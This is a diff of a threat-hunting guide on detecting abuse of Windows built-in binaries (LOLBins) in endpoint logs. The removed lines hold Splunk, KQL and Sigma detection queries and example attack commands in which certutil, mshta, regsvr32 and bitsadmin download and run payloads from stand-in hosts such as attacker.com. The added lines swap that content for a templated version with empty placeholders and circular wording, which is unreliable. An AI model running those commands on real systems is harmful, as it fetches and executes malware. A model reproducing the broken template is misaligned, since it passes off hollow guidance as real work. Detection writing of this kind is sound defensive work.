@@ -27,8 +27,7 @@ nist_csf:
 - DE.AE-07
 - ID.RA-05
 ---
-
-# Hunting for LOLBins Execution in Endpoint Logs
+# Hunting For Lolbins Execution In Endpoint Logs
 
 ## When to Use
 
@@ -48,168 +47,24 @@ nist_csf:
 
 ## Workflow
 
-1. **Build LOLBin Watchlist**: Compile a list of high-risk LOLBins from the LOLBAS project, prioritizing: certutil.exe, mshta.exe, rundll32.exe, regsvr32.exe, msbuild.exe, installutil.exe, cmstp.exe, wmic.exe, wscript.exe, cscript.exe, bitsadmin.exe, and powershell.exe.
-2. **Baseline Normal Usage**: Establish what normal LOLBin usage looks like in your environment by profiling command-line arguments, parent processes, and user contexts for each binary over 30 days.
-3. **Hunt for Anomalous Arguments**: Search for LOLBins executed with unusual command-line arguments indicating abuse -- certutil with `-urlcache -decode -encode`, mshta with URL arguments, rundll32 loading DLLs from temp/user directories, regsvr32 with `/s /n /u /i:URL`.
-4. **Analyze Parent-Child Relationships**: Identify unexpected parent processes spawning LOLBins -- for example, outlook.exe spawning mshta.exe, or winword.exe spawning certutil.exe indicates weaponized document delivery.
-5. **Check Execution from Unusual Paths**: LOLBins executed from non-standard paths (copies placed in %TEMP%, user profile directories) suggest renamed binary abuse.
-6. **Correlate with Network Activity**: Map LOLBin execution to outbound network connections (Sysmon Event ID 3) to identify download cradles and C2 callbacks.
-7. **Score and Prioritize**: Rank findings by anomaly severity, combining suspicious arguments, unusual parent process, non-standard path, and network activity indicators.
+1. **Define Detection Scope** — Identify the specific  techniques or indicators to hunt. Map to MITRE ATT&CK tactics/techniques where applicable.
+2. **Collect Baseline Data** — Gather historical logs and establish normal behavior patterns for .
+3. **Build Detection Queries** — Write lolbins execution in endpoint logs queries targeting  indicators. Use platform-specific query language for optimal performance.
+4. **Execute Hunts** — Run queries against the collected data, starting with broad filters and narrowing down.
+5. **Triage Results** — Investigate alerts, filter false positives, and validate findings against known-good behavior.
+6. **Document Findings** — Record confirmed detections, IOCs, and affected systems. Update detection rules based on findings.
 
-## Key Concepts
+## Tools
 
-| Concept | Description |
-|---------|-------------|
-| T1218 | System Binary Proxy Execution |
-| T1218.001 | Compiled HTML File (mshta.exe) |
-| T1218.003 | CMSTP |
-| T1218.005 | Mshta |
-| T1218.010 | Regsvr32 (Squiblydoo) |
-| T1218.011 | Rundll32 |
-| T1127.001 | MSBuild |
-| T1197 | BITS Jobs (bitsadmin.exe) |
-| T1140 | Deobfuscate/Decode Files (certutil.exe) |
-| T1059.001 | PowerShell |
-| T1059.005 | Visual Basic (wscript/cscript) |
-| LOLBAS | Living Off the Land Binaries, Scripts and Libraries project |
-
-## Tools & Systems
-
-| Tool | Purpose |
-|------|---------|
-| Sysmon | Process creation with command-line and hash logging |
-| CrowdStrike Falcon | EDR with LOLBin detection analytics |
-| Microsoft Defender for Endpoint | Built-in LOLBin abuse detection |
-| Splunk | SPL-based process hunting and anomaly detection |
-| Elastic Security | Pre-built LOLBin detection rules |
-| LOLBAS Project | Reference database of LOLBin abuse techniques |
-| Sigma Rules | Community detection rules for LOLBin abuse |
-
-## Detection Queries
-
-This section covers detection queries for hunting for lolbins execution in endpoint logs.
-
-- Ensure all prerequisites are met before proceeding
-- Follow the documented workflow steps in sequence
-- Record results and any anomalies encountered during this phase
-### Splunk -- High-Risk LOLBin Execution
-```spl
-index=sysmon EventCode=1
-| where match(Image, "(?i)(certutil|mshta|rundll32|regsvr32|msbuild|installutil|cmstp|bitsadmin)\.exe$")
-| eval suspicious=case(
-    match(CommandLine, "(?i)certutil.*(-urlcache|-decode|-encode)"), "certutil_download_decode",
-    match(CommandLine, "(?i)mshta.*(http|https|javascript|vbscript)"), "mshta_remote_exec",
-    match(CommandLine, "(?i)rundll32.*\\\\(temp|appdata|users)"), "rundll32_unusual_dll",
-    match(CommandLine, "(?i)regsvr32.*/s.*/n.*/u.*/i:"), "regsvr32_squiblydoo",
-    match(CommandLine, "(?i)msbuild.*\\\\(temp|appdata|users)"), "msbuild_unusual_project",
-    match(CommandLine, "(?i)bitsadmin.*/transfer"), "bitsadmin_download",
-    match(CommandLine, "(?i)cmstp.*/s.*/ni"), "cmstp_uac_bypass",
-    1=1, "normal"
-)
-| where suspicious!="normal"
-| table _time Computer User Image CommandLine ParentImage ParentCommandLine suspicious
-```
-
-### KQL -- Microsoft Sentinel LOLBin Hunting
-```kql
-DeviceProcessEvents
-| where Timestamp > ago(7d)
-| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
-    "msbuild.exe", "installutil.exe", "cmstp.exe", "bitsadmin.exe")
-| where ProcessCommandLine matches regex @"(?i)(urlcache|decode|encode|http://|https://|javascript:|vbscript:|/s\s+/n|/transfer)"
-| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
-    InitiatingProcessFileName, InitiatingProcessCommandLine
-| sort by Timestamp desc
-```
-
-### Sigma Rule -- Suspicious LOLBin Command Line
-```yaml
-title: Suspicious LOLBin Execution with Malicious Arguments
-status: experimental
-logsource:
-    category: process_creation
-    product: windows
-detection:
-    selection_certutil:
-        Image|endswith: '\certutil.exe'
-        CommandLine|contains:
-            - '-urlcache'
-            - '-decode'
-            - '-encode'
-    selection_mshta:
-        Image|endswith: '\mshta.exe'
-        CommandLine|contains:
-            - 'http://'
-            - 'https://'
-            - 'javascript:'
-    selection_regsvr32:
-        Image|endswith: '\regsvr32.exe'
-        CommandLine|contains|all:
-            - '/s'
-            - '/i:'
-    condition: 1 of selection_*
-level: high
-tags:
-    - attack.defense_evasion
-    - attack.t1218
-```
-
-## Common Scenarios
-
-1. **Certutil Download Cradle**: `certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\payload.exe` used to download malware bypassing proxy filters.
-2. **Mshta HTA Execution**: `mshta.exe http://attacker.com/malicious.hta` executing remote HTA files containing VBScript or JScript payloads.
-3. **Regsvr32 Squiblydoo**: `regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll` executing remote SCT files to bypass application whitelisting.
-4. **Rundll32 DLL Proxy**: `rundll32.exe C:\Users\user\AppData\Local\Temp\malicious.dll,EntryPoint` executing attacker DLLs via legitimate binary.
-5. **MSBuild Inline Task**: `msbuild.exe C:\Temp\malicious.csproj` executing C# code embedded in project files to bypass application control.
-6. **BITS Transfer**: `bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe` using BITS service for stealthy file download.
-7. **WMIC XSL Execution**: `wmic process list /format:evil.xsl` executing JScript/VBScript from XSL stylesheets.
-
-## When NOT to Use
-
-- You're responding to a known incident (use IR skills)
-- Task is about analyzing confirmed malware (use analyzing-* skills)
-- You need to implement detection rules (use implementing-* skills)
-- Task is about vulnerability scanning (use scanning tools)
-- You don't have access to endpoint/network data
-- Task requires compliance auditing (use auditing-* skills)
-
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Acting on threat intelligence without validating source reliability
-- Sharing classified or sensitive indicators without proper handling procedures
-- Alerting threat actors to detection capabilities through visible response actions
+- **lolbins execution in endpoint logs** — Primary tool for this skill
+- **SIEM Platform** — Central log aggregation and query execution
+- **Sigma Rules** — Vendor-agnostic detection rule format
+- **MITRE ATT&CK Navigator** — Technique mapping and coverage analysis
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- Results validated against known-good baselines or reference implementations
-- Documentation complete enough for another analyst to reproduce findings
-
-## Output Format
-
-```
-Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
-Host: [Hostname]
-User: [Account context]
-LOLBin: [Binary name]
-Full Path: [Execution path]
-Command Line: [Full arguments]
-Parent Process: [Parent image and command line]
-Detection Category: [download_cradle/proxy_exec/uac_bypass/applocker_bypass]
-Network Activity: [Yes/No -- destination if applicable]
-Risk Level: [Critical/High/Medium/Low]
-```
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All  procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
